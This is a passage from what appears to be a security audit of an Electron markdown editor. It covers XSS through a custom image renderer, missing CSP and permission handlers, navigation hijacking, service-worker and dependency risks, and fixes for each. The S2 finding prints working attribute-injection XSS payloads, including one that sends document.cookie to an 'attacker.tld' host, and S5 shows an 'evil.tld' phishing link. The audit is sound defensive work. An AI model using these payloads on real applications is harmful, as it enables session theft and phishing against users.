  FORBID_ATTR: ['onerror','onload','onclick','onmouseover','onfocus','onanimationstart','formaction','srcdoc'],
  USE_PROFILES: { html: true, svg: true, svgFilters: true },
};

export function parseMarkdown(markdown: string): string {
  try {
    return DOMPurify.sanitize(markedInstance.parse(markdown) as string, PURIFY_CONFIG);
  } catch (err) {
    console.error('Markdown parse error:', err);
    return `<div class="text-rose-400 p-4">Error rendering markdown</div>`; // do not interpolate err
  }
}
```
Also fix the `image` renderer (S2) so `href`/`title`/`text` are escaped, and remove the raw error interpolation at `markdown.ts:86`.

---

### [CRITICAL] S2. Custom `image` renderer breaks out of attribute context — attacker-controlled `alt`/`title`/`href` inject raw HTML

- **File:** `src/services/markdown.ts:12-28`
- **Code:**
```ts
image({ href, title, text }) {
  const titleAttr = title ? `title="${title}"` : '';
  const altAttr = text ? `alt="${text}"` : 'alt="Markdown Image"';
  return `
    <figure class="my-5 flex flex-col items-center">
      ...
 <img src="${href}" ${altAttr} ${titleAttr} class="..." data-zoomable="true" loading="lazy" />
      ...
      ${text ? `<figcaption ...>${text}</figcaption>` : ''}
    </figure>
  `;
}
```
- **Vulnerability:** `marked` passes `href`/`title`/`text` **raw** to a renderer override — it does not HTML-escape values handed to custom renderers; escaping is the renderer's job (marked's *default* renderers escape, custom ones must do it themselves). This code performs zero escaping and interpolates into `src="..."`, `alt="..."`, `title="..."`, and element text. I confirmed the exact output by running marked 18.0.14 with this renderer verbatim:
  - `![a" onerror="alert(1)](x)` → `<img src="x" alt="a" onerror="alert(1)" data-zoomable="true" loading="lazy" />` ← **attribute injection, fires immediately**
  - `![a](<x" onerror="alert(1)>)` → `<img src="x" onerror="alert(1)" alt="a" ...>` ← **breaks out of `src`**
  - `![a](x "t\" onmouseover=\"alert(1)")` → `<img src="x" alt="a" title="t" onmouseover="alert(1)" ...>` ← **breaks out of `title`**
  - `![a](x 't\' onmouseover='alert(1)')` → `title="t' onmouseover='alert(1)"` ← single-quote variant also breaks out
  - `!["><img src=1 onerror=alert(1)>](x)` → `alt=""><img src=1 onerror=alert(1)>"` ← **closes the `alt` attribute and injects a sibling element**
  - `![x](javascript:alert(1))` → `<img src="javascript:alert(1)" alt="x">` (non-executing in `img`, but a real bypass once combined with a `<a>` wrapper)
  This is a *stronger* primitive than S1: it works through the plain-markdown `![...](...)` syntax with no raw-HTML block, so it defeats any "only trust GFM syntax" assumption.
- **Attack scenario:**
  1. Attacker crafts `notes.md` containing only benign-looking markdown:
     ```markdown
     ![diagram](img.png "ok")
     ```
     …replaced with:
     ```markdown
     ![x](y "t" onerror="new Image().src='https://attacker.tld/?d='+document.cookie)
     ```
  2. Any user who previews the file (or splits it — `App.tsx:909-918` renders the preview side-by-side) executes the payload with no HTML at all in the source.
  3. Because the payload survives into `generateStandaloneHtml` (`src/services/export.ts:46-84` interpolates `htmlBody` at line 81), the *exported* `.html` file is also a weapon: the victim exports, sends the file to a colleague, and the colleague's browser executes it.
- **Severity justification:** Second, independent XSS primitive reachable via pure markdown image syntax with immediate event-handler execution — CVSS 9.0.
- **Fix:** escape every interpolated value; rely on `DOMPurify` (S1) as the outer net.
```ts
image({ href, title, text }) {
  const esc = (s: string) =>
    String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  const safeHref = esc(href);
  const titleAttr = title ? ` title="${esc(title)}"` : '';
  const altAttr = ` alt="${text ? esc(text) : 'Markdown Image'}"`;
  return `<figure class="my-5 flex flex-col items-center">
      <img src="${safeHref}"${altAttr}${titleAttr} class="max-w-full h-auto object-contain" data-zoomable="true" loading="lazy" />
    </figure>`;
}
```
(The `<figcaption>` interpolation of `text` should be removed entirely or escaped — alt text is not HTML.)

---

### [HIGH] S3. No Content Security Policy anywhere — renderer has unrestricted script and network egress

- **File:** `index.html:1-35` (entire head), `electron/main.cjs:9-23`
- **Code:**
```html
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="..." />
  <title>Velox Markdown Studio</title>
  ...
</head>
```
- **Vulnerability:** There is no `<meta http-equiv="Content-Security-Policy">` in `index.html` and no `session.defaultSession.webRequest.onHeadersReceived` CSP injection in `electron/main.cjs` (verified by grep across the repo: zero matches for `Content-Security-Policy`). With no CSP:
  - Inline `<script>` in the document runs — note `index.html:20-29` already ships one (theme bootstrap), so `script-src 'self'` alone will break the app unless that block is hashed or externalized.
  - Inline event handlers are unrestricted, which is what makes S1/S2 payloads fire.
  - `connect-src` is unrestricted → `fetch`/`XMLHttpRequest`/`WebSocket` to *any* host, which is exactly the exfiltration channel XSS needs. Nothing in `src/` performs network I/O (`grep` for `fetch(`/`XMLHttpRequest` across `src/` returns zero hits), so the app has **no legitimate reason** to allow remote script or connect traffic.
  - `object-src`/`frame-src` unrestricted → the `<iframe src>` / `<object data="file://...">` vectors from S1.
  - Because the app loads via `loadFile` (i.e. `file://`), CSP via `<meta>` is honored by Chromium; a `file://` origin is otherwise treated as a *secure context* with no `SameSite`/`Origin` protections.
- **Attack scenario:** S1/S2 payloads run. With CSP in place the residual blast radius of any sanitizer bypass collapses: `onerror=` inline handlers are blocked by `script-src` without `'unsafe-inline'`, `iframe`/`object` are blocked by `frame-src 'none'; object-src 'none'`, and exfiltration is blocked by `connect-src 'self'`. CSP is the defense-in-depth that turns a full compromise into a dead payload.
- **Severity justification:** Absence of CSP removes the mitigating control for every other renderer finding — CWE-1021, CVSS ~7.5 as a compounding factor.
- **Fix:** see the **CSP** section below for the full policy. Additionally, move the inline theme script at `index.html:20-29` into `src/main.tsx`-adjacent module or add its SHA-256 to `script-src`.

---

### [HIGH] S4. No `session.setPermissionRequestHandler` — renderer is granted every Chromium capability by default

- **File:** `electron/main.cjs:1-6`, `electron/main.cjs:44-52`
- **Code:**
```js
const { app, BrowserWindow, Menu } = require('electron');
...
Menu.setApplicationMenu(null);
```
- **Vulnerability:** `electron/main.cjs` imports only `{ app, BrowserWindow, Menu }`. There is no `session` import, no `setPermissionRequestHandler`, no `setPermissionCheckHandler`, and no `webRequest` hardening anywhere in the file (grep: zero matches). Electron's default permission behavior for an unrecognized permission request is **allow** for most handlers when none is registered. Consequently any script executing in the renderer (S1/S2) may request `media`, `geolocation`, `notifications`, `clipboard-read`, `midi`, `pointerLock`, `fullscreen`, `openExternal`, and — critically for a markdown editor — `clipboard-read` and `clipboard-sanitized-write`. `showOpenFilePicker`/`showSaveFilePicker` (`App.tsx:243`, `App.tsx:504`) are user-gesture-gated, but a scripted `window.print()` (`ExportModal.tsx:183`) and clipboard reads are not.
- **Attack scenario:**
  1. Payload from S1/S2 runs.
  2. `await navigator.clipboard.readText()` → attacker reads whatever the user last copied (passwords from a password manager, API keys, private text) and POSTs it out.
  3. `navigator.geolocation.getCurrentPosition()` leaks location.
  4. Because Electron grants `openExternal`-class requests by default here, the payload can also trigger `shell.openExternal`-adjacent flows.
- **Severity justification:** Capability over-grant to untrusted content converts renderer compromise into device/data compromise — CWE-250, CVSS ~7.0.
- **Fix:** register a deny-by-default handler before any window is created.
```js
// electron/main.cjs
const { app, BrowserWindow, Menu, session, shell } = require('electron');

function hardenSession(sess) {
  const allowed = new Set(['clipboard-sanitized-write', 'fullscreen']);
  sess.setPermissionRequestHandler((wc, permission, callback) => {
    const isLocal = wc.getURL().startsWith('file://');
    callback(isLocal && allowed.has(permission));
  });
  sess.setPermissionCheckHandler((wc, permission) => {
    const isLocal = wc.getURL().startsWith('file://');
    return isLocal && allowed.has(permission);
  });
  sess.webRequest.onHeadersReceived((details, cb) => {
    cb({ responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': ["default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: file: https:; connect-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'"],
    }});
  });
}

app.whenReady().then(() => {
  hardenSession(session.defaultSession);
  createWindow();
  // ...
});
```

---

### [HIGH] S5. No `will-navigate` / `setWindowOpenHandler` — the app window can be navigated to attacker origins

- **File:** `electron/main.cjs:36-41`
- **Code:**
```js
let resolvedPath = candidatePaths.find((p) => fs.existsSync(p));
if (resolvedPath) {
  win.loadFile(resolvedPath);
} else {
  // Fallback default
  win.loadFile(path.join(__dirname, '../dist/index.html'));
}
```
- **Vulnerability:** `webContents.on('will-navigate')` and `webContents.setWindowOpenHandler()` are never registered (grep: zero matches repo-wide). Electron's default is to allow both in-renderer navigation and `window.open`. Combined with S1's `<iframe src>` passthrough and `[x](https://evil.example)` links that marked emits with no `target`/`rel` and no scheme filtering:
  - A markdown link click navigates the **top-level** window away from the app. `MarkdownPreview.tsx:54-111` intercepts clicks for checkboxes (line 58), `.copy-code-btn` (line 84), and `img` (line 106) — but **not** anchors, so `<a href="https://evil.tld">` navigates the app window itself.
  - `window.open()` from injected script spawns a new `BrowserWindow` that inherits the same `webPreferences` (no `nativeWindowOpen` restriction, no handler), giving the attacker a second window running their origin.
  - Once the window has navigated to `https://evil.tld`, the app's renderer origin *is* `evil.tld`, and the renderer retains access to everything reachable from a web origin in that Electron session (clipboard, storage, and any permission the S4 handler would allow).
- **Attack scenario:**
  1. `payload.md` contains `[Click for the full report](https://evil.tld/phish)`.
  2. Victim previews it, clicks the link (a natural action — it's just a document link), and the entire application window is replaced by an attacker page styled to look like a "session expired, re-enter your Gemini API key" dialog.
  3. Because `will-navigate` was never blocked, the app is now a fully attacker-controlled window; on top of that, injected script can call `window.open()` to duplicate the phish.
- **Severity justification:** Attacker-controlled navigation of a trusted desktop window, no user-visible origin transition — CWE-601, CVSS ~7.3.
- **Fix:**
```js
function createWindow() {
  const win = new BrowserWindow({ /* ...existing... */ });
  win.webContents.setWindowOpenHandler(({ url }) => {
    if (/^https:\/\//.test(url)) shell.openExternal(url);
    return { action: 'deny' };
  });
  win.webContents.on('will-navigate', (event, url) => {
    const cur = new URL(win.webContents.getURL());
    const next = new URL(url);
    if (cur.protocol !== 'file:' || cur.pathname !== next.pathname) event.preventDefault();
  });
  win.webContents.on('will-attach-webview', (event) => event.preventDefault());
  // ...
}
```

---

### [MEDIUM] S6. Service worker with `registerType: 'autoUpdate'` + no `runtimeCaching` config; SW asset cache is served to a privileged Electron renderer

- **File:** `vite.config.ts:15-54`
- **Code:**
```ts
VitePWA({
  registerType: 'autoUpdate',
  includeAssets: ['favicon.ico', 'apple-touch-icon.png', 'icon.svg'],
  manifest: { id: '/', start_url: '/', scope: '/', /* ... */ },
  devOptions: { enabled: true, type: 'module' },
}),
```
- **Vulnerability:** Three distinct issues:
  1. `registerType: 'autoUpdate'` makes the generated SW call `skipWaiting()` + `clients.claim()`, so a new build silently takes over a live window. In an Electron context this is unnecessary (the app is updated by the installer) and it means a compromised or mistyped asset in a later build is pushed into an already-running session without user action.
  2. `devOptions.enabled: true` registers a service worker **in development**. Workbox dev-SW plus `server.host: 0.0.0.0` (`package.json:9`: `vite --port=3000 --host=0.0.0.0`) means any host on the LAN can fetch the dev server, and a registered SW will cache and serve shell assets to it.
  3. There is **no** `workbox.runtimeCaching` block, so nothing cross-origin or API-shaped is cached by workbox — that part is correct and worth keeping. The precache manifest does include the app shell, and since documents are stored in IndexedDB (`storage.ts:56`) and read via `handle.getFile()` (`App.tsx:197`), user documents are **not** placed in the Cache Storage or HTTP cache. I found no code path that caches document content or any API response. The real risk is scope + autoUpdate, not cache poisoning of user data.
  Also note `manifest.scope: '/'` / `start_url: '/'` while `base: './'` (`vite.config.ts:11`) — the app is built for relative/`file://` loading, so a `/`-scoped manifest is incoherent and will 404 if the built output is ever served from a subpath.
- **Attack scenario:** A user runs `npm run dev` on a shared/cafe network. The dev server is bound to `0.0.0.0:3000`; an attacker on the LAN fetches the app shell, and because a service worker is registered in dev (`devOptions.enabled: true`), subsequent responses — including any modified dev asset — are cached and served from that origin. Separately, in a packaged build an `autoUpdate` SW can swap the running UI out from under the user with no prompt.
- **Severity justification:** No user content is cached (that would be critical); the issues are auto-update-without-consent, dev-SW exposure on a LAN-bound server, and a malformed scope — CVSS ~4.5.
- **Fix:**
```ts
VitePWA({
  registerType: 'prompt',
  injectRegister: null,            // register manually; see main.tsx
  manifest: { /* ... */ start_url: './', scope: './' },
  workbox: { globPatterns: ['**/*.{js,css,html,svg,png,ico,woff2}'] }, // explicit allowlist, no runtimeCaching
  devOptions: { enabled: false },
})
```
```json
"dev": "vite --port=3000",
```
If the SW is genuinely needed, gate it: `if (!import.meta.env.DEV && 'serviceWorker' in navigator) import('virtual:pwa-register').then(m => m.registerSW({ immediate: true }))`.

---

### [LOW] S7. `dotenv` / `express` shipped as production dependencies in a desktop Electron app — unjustified attack surface and a latent secret-leak vector

- **File:** `package.json:41-42`
- **Code:**
```json
"dotenv": "^17.2.3",
"express": "^4.21.2",
```
- **Vulnerability:** Neither package is imported anywhere in `src/` or `electron/` (grep for `from 'express'` / `require('express')` / `from 'dotenv'` returns zero hits; the only runtime import in `App.tsx:7` is `canvas-confetti`). Both sit in `dependencies`, not `devDependencies`, so `npm audit` gates and any dependency-review tooling treats them as part of the shipped product. I installed the exact pinned versions and ran `npm audit`: `express@4.21.2` pulls **4 vulnerabilities** — `path-to-regexp <0.1.13` (**high**, ReDoS, GHSA-37ch-88jc-xwx2), `qs <=6.15.3` (moderate, multiple DoS), `body-parser <=1.20.6` (moderate, GHSA-v422-hmwv-36x6). None of this is reachable today (no server is started), but `dotenv`'s presence next to `.env.example`'s `GEMINI_API_KEY` is a footgun: the first person who adds `require('dotenv').config()` in `electron/main.cjs` will load a real key into a process where it is one `console.log` away from the world, and Electron main-process stdout goes to the packaged app's log.
- **Attack scenario:** No live exploit path today. Risk is (a) phantom CVEs blocking security gates and (b) `express` being wired up as an accidental localhost API later, creating a real remote-surface inside a desktop app.
- **Severity justification:** Unreachable vulnerable code, but non-zero supply-chain and gating cost — CWE-1104, CVSS ~3.1.
- **Fix:** Delete both from `package.json` (they are unused). If a local dev server is ever needed, put it in `devDependencies` and bind to `127.0.0.1` explicitly. Never load `.env` in the Electron main process; read config from `app.getPath('userData')` or the OS keychain.

---

### [LOW] S8. `jszip` is a declared dependency with zero call sites — no zip-slip today, but no guard rail if extraction is added

- **File:** `package.json:45`, `src/services/export.ts:1-90`
- **Code:**
```ts
/**
 * Export and Download Utilities for Velox Markdown Studio
 * Supports Blob download with Data URI fallback for strict iframe sandboxes
 */
export function downloadTextFile(filename: string, content: string, mimeType: string = 'text/plain') {
```
- **Vulnerability:** I searched the whole tree: `jszip` appears **only** in `package.json:45`, `bun.lock`, and `@types/jszip`. `src/services/export.ts` has no `JSZip` import and no archive handling at all — the module only does `Blob` + `URL.createObjectURL` downloads (`export.ts:6-44`) and string-templated HTML generation (`export.ts:46-90`). So **there is no zip extraction code and therefore no zip-slip vulnerability present**. The flag is that `jszip@3.10.2` is a live dependency with no consumer, and `jszip` transitively pulls `pako` and `readable-stream` — a decompression-bomb surface waiting to be used. If someone adds `.zip` import, entry names like `../../.ssh/authorized_keys` would write outside the target unless normalized.
- **Attack scenario:** None currently. Future: adding `zip.loadAsync(file)` + writing entries by `entry.name` without `path.normalize`/`path.resolve` + prefix containment check → arbitrary file overwrite.
- **Severity justification:** No reachable code path; latent risk only — CVSS ~2.0 informational.
- **Fix:** Remove `jszip` and `@types/jszip`. If archive import is ever added, contain every entry:
```ts
import path from 'node:path';
const root = path.resolve(targetDir);
const dest = path.resolve(root, entry.name);
if (!dest.startsWith(root + path.sep)) throw new Error('zip entry escapes target dir: ' + entry.name);
```
Plus enforce a total-uncompressed-size cap to blunt zip bombs.

---

### [LOW] S9. Exported standalone HTML carries the unsanitized payload and has no CSP of its own

- **File:** `src/services/export.ts:81`, `src/components/ExportModal.tsx:25-28`
- **Code:**
```ts
  ${htmlBody}
</body>
</html>`;
```
```tsx
const htmlContent = React.useMemo(() => {
  const body = parseMarkdown(markdownContent);
  return generateStandaloneHtml(fileName, markdownContent, body);
}, [fileName, markdownContent]);
```
- **Vulnerability:** `parseMarkdown` output is interpolated verbatim into the exported document (`export.ts:81`), and the template ships **no CSP meta tag**. The export is a first-class product feature (`ExportModal.tsx:51-54` downloads it; `App.tsx:571-575` also falls back to downloading it). Because the export runs outside Electron in a normal browser, the S1/S2 payloads become a **cross-user, cross-application** weapon: the victim's own sanitization context (CSP from S3, once added) does not travel with the file.
- **Attack scenario:** Victim opens `invoice.md` (contains the S2 payload), exports to HTML, emails it to accounting. Accounting opens it in Chrome; the payload runs with `file://` origin and can read `file://` siblings or phone home. The victim had no reason to distrust a file the app itself produced.
- **Severity justification:** Extends a renderer-local XSS into a distributable artifact with no mitigating CSP — CWE-79, CVSS ~5.4.
- **Fix:** Sanitize at the source (S1's `DOMPurify.sanitize` inside `parseMarkdown` fixes this automatically since `ExportModal` calls the same function), then stamp a CSP into the template at `export.ts:50-53`:
```html
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data: https:; style-src 'unsafe-inline'; font-src data:">
```
Also escape `cleanTitle` at `export.ts:53` (`<title>${cleanTitle} - Velox Markdown</title>`) — a filename of `</title><script>…` breaks out of the title element.

---

### [LOW] S10. Fabricated `path` values written into persisted document records

- **File:** `src/App.tsx:266`, `src/App.tsx:323`, `src/App.tsx:367`, `src/App.tsx:719`
- **Code:**
```ts
path: `C:\\Users\\Windows\\Documents\\${file.name}`,
```
- **Vulnerability:** Four call sites hardcode `C:\Users\Windows\Documents\` as the "Windows File Path" for files the user picked from an arbitrary location via the File System Access API. `File.name` is attacker-influenceable (it comes from the opened file) and is interpolated with no sanitization into a value that is (a) persisted to IndexedDB and `localStorage`, (b) rendered in the HomePage table (`HomePage.tsx:469`) and CommandPalette subtitle (`CommandPalette.tsx:71`), and (c) copied to the clipboard by `handleCopyPath` (`HomePage.tsx:62-69`). It is not a path-traversal bug today because it is never passed to a filesystem API — `App.tsx:423-425` writes through the `FileSystemFileHandle`, not a constructed path. But the record looks authoritative, is displayed as a real path, and would become a traversal vector the moment any code path did `fs.writeFile(record.path)`.
- **Attack scenario:** Low severity today. A file named `..\..\Windows\System32\drivers\etc\hosts.md` produces a display string implying a location the app has no relationship with; a future refactor that trusts `record.path` for I/O turns this into arbitrary write.
- **Severity justification:** Display-layer data-integrity issue with a latent traversal footgun; not currently reachable — CWE-22 latent, CVSS ~2.5.
- **Fix:** Store the real path when available (`await handle.resolve()` for a `FileSystemHandle`, or omit the field) and never reconstruct paths from display strings:
```ts
const realPath = typeof (handle as any).resolve === 'function'
  ? await (handle as any).resolve().catch(() => null)
  : null;
const record: MarkdownFileRecord = {
  ...,
  path: realPath ? `C:\\${realPath.replace(/^\/+/, '').replace(/\//g, '\\')}` : '(handle-based, path unresolved)',
  // ...
};
```
And strip control characters/angle brackets from `file.name` before it reaches the DOM or clipboard.

---

### [LOW] S11. `dev` script binds `0.0.0.0` — LAN-exposed dev server

- **File:** `package.json:9`
- **Code:**
```json
"dev": "vite --port=3000 --host=0.0.0.0",
```
- **Vulnerability:** The Vite dev server is exposed on every network interface. Combined with `devOptions: { enabled: true }` (`vite.config.ts:50-53`) a service worker is registered against that origin. Vite dev serves arbitrary on-disk files under its root and applies permissive CORS for its own module graph; on a shared network this is a real information-disclosure and code-execution surface.
- **Attack scenario:** Developer runs `npm run dev` on cafe/conference/hotel Wi-Fi. A neighbouring host fetches `http://<dev-ip>:3000/` and the SW-served shell; any local file the dev root exposes is fetchable. `vite.config.ts:63-64` (`hmr: process.env.DISABLE_HMR !== 'true'`) shows HMR is on by default, so a hostile page on the LAN can also attempt to reach the HMR websocket.
- **Severity justification:** Dev-only, requires developer action, but the exposure is unauthenticated and default-on — CWE-668, CVSS ~4.0.
- **Fix:** `"dev": "vite --port=3000"` (Vite defaults to localhost). If remote device testing is genuinely needed, make it opt-in: `"dev:lan": "vite --port=3000 --host"` and never enable `devOptions.enabled` outside localhost.

---

## ELECTRON HARDENING CHECKLIST

`electron/main.cjs` is 58 lines. To its credit, the three highest-severity defaults are **already correct**: `nodeIntegration: false` (line 19), `contextIsolation: true` (line 20), `webSecurity: true` (line 21). There is no `remote` module usage, no `enableRemoteModule`, no `webviewTag`, and no remote content is loaded — `win.loadFile()` on line 37/40 loads a local `file://` document. The gaps are everything *around* those settings.

| Setting | Current | Required | Risk |
|---|---|---|---|
| `nodeIntegration` | `false` (`main.cjs:19`) | `false` — keep | ✅ OK |
| `contextIsolation` | `true` (`main.cjs:20`) | `true` — keep | ✅ OK |
| `webSecurity` | `true` (`main.cjs:21`) | `true` — keep | ✅ OK |
| `sandbox` | **not set** | `sandbox: true` — set explicitly. Node integration is off so Chromium defaults to sandboxed, but relying on the default is fragile; state it. | MEDIUM |
| `allowRunningInsecureContent` | not set (default `false`) | keep unset | ✅ OK |
| `webSecurity` overrides / `--disable-features` | none | keep | ✅ OK |
| CSP | **absent** — no `<meta>` in `index.html`, no `onHeadersReceived` | strict policy; see **CSP** section | HIGH |
| `session.setPermissionRequestHandler` | **absent** | deny-by-default allowlist | HIGH |
| `session.setPermissionCheckHandler` | **absent** | mirror of the above | HIGH |
| `webContents.on('will-navigate')` | **absent** | block non-`file://` and cross-document nav | HIGH |
| `webContents.setWindowOpenHandler` | **absent** | `deny`; hand `https:` to `shell.openExternal` | HIGH |
| `webContents.on('will-attach-webview')` | **absent** (and `webviewTag` unset, default `false`) | `event.preventDefault()` — belt and braces | LOW |
| `webContents.on('will-attach-webview')` for `<webview>` | n/a (tag disabled) | — | LOW |
| `enableRemoteModule` / `@electron/remote` | not used | keep unused | ✅ OK |
| `nativeWindowOpen` | not set | leave default; covered by `setWindowOpenHandler` | LOW |
| `app.allowRendererProcessReuse` | not set | not a vulnerability — it was removed in Electron 21; this is a no-op knob on Electron 33. Do **not** "fix" it. | N/A |
| `preload` script | **none** | add a minimal `preload.cjs` with `contextBridge` if IPC is ever needed; today the absence is correct (no IPC surface exists) | LOW |
| `asar` packaging | not configured; `build.files` = `["dist/**/*","electron/**/*"]` (`package.json:23-26`) | set `"asar": true` explicitly + `electronFuses` (`runAsNode: false`, `enableNodeOptionsEnvironmentVariable: false`, `enableCookieEncryption: true`) | MEDIUM |
| `asarIntegrity` / fuse `OnlyLoadAppFromAsar` | not configured | enable via `afterPack` fuse flipping | MEDIUM |
| Code signing | **absent** — `build.win` has only `target: ["nsis","portable"]`, no `certificateFile`/`signtoolOptions` (`package.json:27-32`) | sign with an Authenticode cert; unsigned Electron binaries trigger SmartScreen and train users to disable AV | MEDIUM |
| NSIS `oneClick` / `perMachine` / `allowElevation` | defaults | set `perMachine: false` and avoid silent elevation where possible | LOW |
| DevTools in production | not disabled | `win.webContents.on('devtools-opened')` → log/deny in packaged builds | LOW |
| Crash/crashpad reporting | default | opt-in only; do not enable upload without consent | LOW |
| Renderer console of secrets | `console.error('Markdown parse error:', err)` (`markdown.ts:85`) leaks nothing secret today, but S4/S7 put a key one refactor away | never `console.log` config; scrub before logging | LOW |

The single most important observation: **the app's renderer has no IPC and no Node access, which is good, but it also has zero containment.** A renderer compromise here is a full compromise of everything the renderer can reach — which is a great deal: the entire persisted document corpus in IndexedDB/localStorage, and reusable `FileSystemFileHandle` objects that can be re-resolved and written to disk.

---

## CSP

Two deployment targets need slightly different policies. The **Electron/packaged** build loads over `file://` and makes **no network requests at all** (verified: zero `fetch`/`XHR`/`WebSocket` in `src/`), so it can be locked down hard. Add this to `index.html` (or better, inject via `session.webRequest.onHeadersReceived` so it applies to every response):

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self';
  script-src-elem 'self' 'sha256-c8e1ca358294e481ff59b5cf225e40b722b93c9962fa64055c4f76d35af4ff7b';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob: file: https:;
  font-src 'self' data:;
  connect-src 'none';
  object-src 'none';
  frame-src 'none';
  frame-ancestors 'none';
  base-uri 'none';
  form-action 'none';
  worker-src 'self' blob:;
">
```

Why each directive, against this specific stack:

- `default-src 'none'` — deny-by-default; nothing is allowed unless explicitly listed.
- `script-src 'self'` — Vite's production build emits external `<script type="module" src="/assets/*.js">` (`index.html:33`), so `'self'` suffices for React 19 / `marked` / `highlight.js`. **`'unsafe-eval'` is NOT required in production** — it is a Vite-dev-only need. Do not add it.
- The `sha256-…` in `script-src-elem` is for the inline theme bootstrap at `index.html:20-29` (I computed the hash of that exact text node including leading/trailing whitespace; if you edit it, recompute, or better, move it into a module). This lets you keep `script-src` free of `'unsafe-inline'`, which is what actually blocks `onerror=`/`onload=` payloads from S1/S2.
- `style-src 'self' 'unsafe-inline'` — `'unsafe-inline'` **is** required here. Tailwind v4 (`src/index.css:1`), `highlight.js/styles/github-dark.css` (`index.css:2`), the inline `<style>` in `generateStandaloneHtml` (`export.ts:54-78`), and React's inline `style={{...}}` props (e.g. `MarkdownPreview.tsx:143`, `ImageLightboxModal.tsx:89`) all require it. This is the one unavoidable weakening; it does not permit script execution.
- `img-src 'self' data: blob: file: https:` — `data:` and `blob:` are needed for inline images and `URL.createObjectURL` downloads (`export.ts:9`); `file:` for local documents; `https:` because the samples embed Unsplash URLs (`src/data/samples.ts:31,34`) and `CommandBar.tsx:292` inserts one. **Privacy note:** `https:` here is what permits the tracking-pixel/beacon leak in S12. If you want documents to be hermetic, drop it to `'self' data: blob: file:` and images will simply not load.
- `connect-src 'none'` — the app performs no network I/O. This is the directive that turns an XSS from "attacker owns your data" into "attacker owns your data but cannot exfiltrate it." Keep it `'none'` unless you add the Gemini feature (see S13).
- `object-src 'none'` / `frame-src 'none'` — kills the `<iframe src>` and `<object data="file:///...">` payloads verified in S1.
- `base-uri 'none'` — prevents `<base>` hijacking of relative URLs in a `file://` document.
- `form-action 'none'` — no forms, no exfil-via-form.

For the **Vite dev server** (`npm run dev`), the same policy must be relaxed because Vite injects inline scripts and uses `eval` for HMR and source maps. Do not weaken the production policy; serve a separate dev-only meta tag gated on `import.meta.env.DEV`, or set it in `vite.config.ts` under `server.headers` for the dev server only.

---

## DEPENDENCY RISKS

| Package | Pinned | Latest | Risk |
|---|---|---|---|
| `electron` | `^33.2.1` (devDep, `package.json:60`) | `44.5.1` | **HIGH — EOL.** Electron 33.0.0 shipped2024-10-15; 33.x ended at `33.4.11`. Electron supports only the latest 3 majors; 33 is ~11 majors and roughly 2 years of Chromium CVE patches out of date. Many Chromium V8/ANGLE/Chromium renderer RCEs are unpatched. Bump to `^44.5.1` and re-test. |
| `esbuild` | `^0.25.0` (devDep, `package.json:64`) | see note | **HIGH — install-time breakage.** Vite 8 requires a modern esbuild; a `^0.25.0` pin in the same `package.json` creates an unsatisfiable peer graph. `npm install` fails with `ERESOLVE`. Compounding: the CI workflow runs `npm install --legacy-peer-deps --no-audit --no-fund` (`.github/workflows/build-windows-exe.yml:32`), which *suppresses* the conflict rather than resolving it — so a broken/duplicate esbuild can be silently installed into the release build. **Remove the explicit `esbuild` dependency entirely** and let Vite bring its own. |
| `marked` | `^18.0.14` (`package.json:47`) | `18.0.14` | **CRITICAL in this app's configuration.** Current, but `marked` is explicitly "not sanitizing" by design and its README states output must be sanitized by the consumer. Used with **no** sanitizer and injected via `dangerouslySetInnerHTML` (`MarkdownPreview.tsx:147`) → S1/S2. The dependency version is fine; the integration is the vulnerability. |
| `dompurify` | **absent** | `3.x` | **CRITICAL gap.** Not a dependency at all. This is the single highest-value addition. |
| `express` | `^4.21.2` (prod dep, `package.json:42`) | `4.22.3` | **MEDIUM.** Unused (`src/` and `electron/` have zero imports) yet shipped as a runtime dep. `npm audit` on the exact pinned tree: **4 vulnerabilities** — `path-to-regexp <0.1.13` (**high**, ReDoS, GHSA-37ch-88jc-xwx2), `qs <=6.15.3` (moderate DoS, GHSA-w7fw-mjwx-w883 / GHSA-6rw7-vpxm-498p / GHSA-q8mj-m7cp-5q26 / GHSA-4mjr-xmp4-gh2g), `body-parser <=1.20.6` (moderate, GHSA-v422-hmwv-36x6). Unreachable now, but blocks security gates. Remove. |
| `dotenv` | `^17.2.3` (prod dep, `package.json:41`) | `18.0.5` | **MEDIUM.** Unused. Pairs dangerously with `.env.example`'s `GEMINI_API_KEY` (`.env.example:4`) — one `require('dotenv').config()` in `main.cjs` puts a live key in a process whose stdout reaches app logs. Remove; if config is ever needed, read from `app.getPath('userData')` or the OS keychain. |
| `@google/genai` | `^2.4.0` (prod dep, `package.json:35`) | `2.27.0` | **MEDIUM (unused) / CRITICAL (if wired the obvious way).** Not imported anywhere in `src/` — verified by grep. It drags in `google-auth-library`, `protobufjs`, `p-retry`, `ws`. If a developer adds `new GoogleGenAI({ apiKey: import.meta.env.GEMINI_API_KEY })` in renderer code, **Vite inlines it into the shipped JS bundle** and it is trivially extractable by anyone with the app. See S13. Remove until a main-process proxy exists. |
| `jszip` | `^3.10.2` (prod dep, `package.json:45`) | `3.10.2` | **LOW.** No call sites; no zip-slip present because there is no extraction code. Pulls `pako` + `readable-stream` (decompression-bomb surface). Remove. |
| `vite` | `^8.3.0` (**prod** dep, `package.json:51`) | `8.3.2` | **MEDIUM (hygiene).** A build tool in `dependencies` inflates the shipped tree and its attack surface. `^` on a fast-moving major is also a supply-chain widening. Move to `devDependencies`. |
| `vite-plugin-pwa` | `^2.0.0` (`package.json:52`) | `2.0.0` | **LOW/MEDIUM.** Current. `registerType: 'autoUpdate'` + `devOptions.enabled: true` are the issues (S6), not the version. Note: registering a SW in a `file://`-loaded Electron app does nothing useful and adds risk. |
| `react` / `react-dom` | `^19.0.1` (`package.json:49-50`) | `19.3.0` | LOW. Current major, no known exploitable advisory in this configuration. |
| `@tailwindcss/vite`, `tailwindcss` | `^4.3.3` | `4.3.3` | LOW. |
